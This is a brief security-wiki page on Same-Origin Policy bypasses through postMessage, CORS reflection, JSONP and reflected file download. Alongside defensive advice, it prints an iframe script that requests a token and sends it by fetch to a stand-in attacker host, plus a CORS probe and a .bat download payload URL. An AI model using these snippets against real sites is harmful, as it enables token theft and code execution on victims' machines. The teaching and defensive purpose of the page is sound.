---
title: Same-Origin Policy Bypasses
slug: same-origin-policy-bypasses
---

> **TL;DR:** The Same-Origin Policy is enforced by a patchwork of browser checks; weak `postMessage` validation, sloppy CORS reflection, JSONP callbacks, and legacy `document.domain` tricks each carve holes through it.

## What it is
SOP isolates documents by `(scheme, host, port)`, but apps voluntarily punch holes for messaging, embedding, and APIs. When those holes lack origin checks, an attacker page can read or write data that should be private to the target. Reflected file download (RFD) is a cousin: the browser treats a victim-origin URL as a downloadable executable controlled by the attacker.

## Preconditions / where it applies
- `postMessage` listeners that skip or wildcard `event.origin`
- CORS handlers that echo the `Origin` request header into `Access-Control-Allow-Origin` with `Allow-Credentials: true`
- JSONP endpoints whose callback parameter is not restricted to `[A-Za-z0-9_]`
- Legacy pages still calling `document.domain = "example.com"` (deprecated and being removed from browsers)
- Sandboxed iframes missing `allow-same-origin` removal, or `srcdoc` documents inheriting the parent origin

## Technique
Hostile postMessage probe:
```html
<iframe src="https://target.tld/widget" id="f"></iframe>
<script>
  f.onload = () => f.contentWindow.postMessage({cmd:"exportToken"}, "*");
  addEventListener("message", e => fetch("https://attacker.tld/x?d="+btoa(JSON.stringify(e.data))));
</script>
```

CORS reflection check:
```bash
curl -sI -H 'Origin: https://attacker.tld' https://api.target.tld/me \
  | grep -iE 'access-control-allow-(origin|credentials)'
```

RFD payload (JSONP that becomes `report.bat`):
```
https://target.tld/api/jsonp?callback=||calc||;//setup.bat
```

## Detection and defence
- Always check `event.origin` against an allowlist in postMessage handlers
- Reflect CORS origins only from a server-side allowlist; never combine wildcards with credentials
- Constrain JSONP callbacks to `^[A-Za-z0-9_$.]{1,64}$` and force `Content-Type: application/javascript` plus `X-Content-Type-Options: nosniff`
- Stop relying on `document.domain`; use `postMessage` + `Origin-Agent-Cluster` headers instead

## References
- [MDN — Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) — canonical browser reference
- [PortSwigger — CORS misconfigurations](https://portswigger.net/web-security/cors) — exploitation patterns and origin-reflection bugs

See also: [[cors-misconfig]], [[dns-rebinding]], [[oauth-flows]].
